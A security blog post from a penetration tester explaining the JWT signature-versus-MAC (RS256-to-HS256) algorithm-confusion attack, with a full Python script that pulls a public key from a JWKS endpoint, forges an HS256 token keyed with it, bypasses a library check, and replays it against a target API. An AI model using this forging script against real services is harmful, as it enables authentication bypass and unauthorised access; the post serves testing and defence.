---
layout: post
title: "JWT: Signature-vs-MAC attacks"
categories: ["security"]
date: 2019-05-16
---

During a recent pen-test I stumbled upon a [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token)(in short: JWT) based authorization scheme. JWTs consist of three parts: header, payload and verification information. The initial header part contains the name of the algorithm that will later be used to generate the verification part of the JWT. This is dangerous as an attacker can change this information and thus (maybe) control what scheme will be used for verification by the server.

Two commonly used schemes are RS256 ([digital signature](https://en.wikipedia.org/wiki/Digital_signature)-based algorithm) and HS256 ([MAC](https://en.wikipedia.org/wiki/Message_authentication_code)-based algorithm). An insecure option would be the NULL-scheme: do not include any verification information at all --- sadly the NULL scheme was not accepted by the target web server.

There is a slight change of a "type confusion"-alike attack against JWT that can occur if the server implementation uses a JWT verification library by just calling code similar to `verify(token, key)` and assumes that only digitally-signed tokens will be used. In this case, the second parameter `key` will always be the public key that will be sued for verification (digital signatures use a private key for creating the signature, and the corresponding public key for verifying the created signature).

An attacker can now retrieve the public key, create a new MAC-based token and use the public key for creating the verification part of the newly created token. In a MAC-based scheme only a secret key is needed to create the verification information and the attacker thus uses the public key (of the digital signature) as secret key for the MAC. If this token is now passed to the `verify` operation on the server, the library would identify the to-be-used scheme from the token (which was set by the attacker to be `HS256` indicating the MAC-scheme). The verification library will then use the second parameter as input for creating the MAC. As this is the public key, the created MAC is the same as the MAC passed by the attacker, both match and the server will accept the forged token. What should have the application developer done better? If a token is accepted by the server, it must always check if the used algorithm is the same as the developer originally assumed to be used.

In theory, this should be easy to test but I didn't find any working tool for that. So I scripted it myself in python. To use it, you have to configure the following in the source code:

* `jwks_url`: where to get the public key info from. [JWKS](https://auth0.com/docs/jwks) is used to publicly distribute key information by many services.
* `operation_url`: an HTTP GET operation that users a JWT-token for authorization
* `token`: a valid JWT for the configured operation
* `audience`: the audience that the token was configured for

The script does the following:

* download a JWKS configuration file and extract the public key parameters. Create a pem-representation out of that.
* verify that the configured token can be validated with the extracted public key
* perform the configured operation with the valid token and output both the resulting HTTP status code as well as the resulting document (it is assumed that this will be a JSON document)
* create a new token based upon the configured token. In this token the token type will be changed to `HS256`; a MAC (based upon the public key) will be computed and used as verification information for the token.
* execute the configured operation again with the modified token and output the HTTP status code as well as the returning document.

As the returning status code (with the modified token) was 401 (authorization denied) the server-side authorization checks of the target web-server seem to work and it thus was not vulnerable against the signature-vs-mac confusion attack. If it would have been worked, identical HTTP status codes and similar result documents should have been produced by both HTTP calls (with the original as well as with the modified token).

Hope that helps with your pen-testing, feel free to adapt the python script:


~~~ python
import jwt
import requests

from jwcrypto import jwk
from cryptography.x509 import load_pem_x509_certificate
from cryptography.hazmat.backends import default_backend

# configuration
jwks_url = "https://localhost/oauth2/.well-known/jwks.json"
operation_url = "https://localhost/web/v1/user/andy"
audience = "https://localhost"
token = "eyJh..."

# retrieves key from jwks
def retrieve_jwks(url):
    r = requests.get(url)
    if r.status_code == 200:
        for key in r.json()['keys']:
            if key['kty'] == "RSA":
                return jwk.JWK(**key)
        print("no usable RSA key found")
    else:
        print("could not retrieve JWKS: HTTP status code " + str(r.status_code))

def extract_payload(token, public_key, audience):
    return jwt.decode(token, public_key, audience=audience, algorithms='RS256')

def retrieve_url(url, token):
    header = {'Authorization' : "Bearer " + token}
    return requests.get(url, headers=header)

# call the original operation and output it's results
original = retrieve_url(operation_url, token)
print("original: status: " + str(original.status_code) + "\nContent: " + str(original.json()))

# get key and extract the original payload (verify it during decoding to make
# sure that we have the right key, also verify the audience claim)
public_key = retrieve_jwks(jwks_url).export_to_pem()
payload = extract_payload(token, public_key, audience)
print("(verified) payload: " + str(payload))

# create a new token based upon HS256, cause the jwt library checks this
# to prevent against confusion attacks.. that we actually try to do (:
mac_key = str(public_key).replace("PUBLIC", "PRIVATE")
hs256_token = jwt.encode(payload, key=mac_key, algorithm="HS256")

# call the operation with the new token
modified = retrieve_url(operation_url, str(hs256_token))
print("modified: status: " + str(modified.status_code) + "\nContent: " + str(modified.json()))
~~~
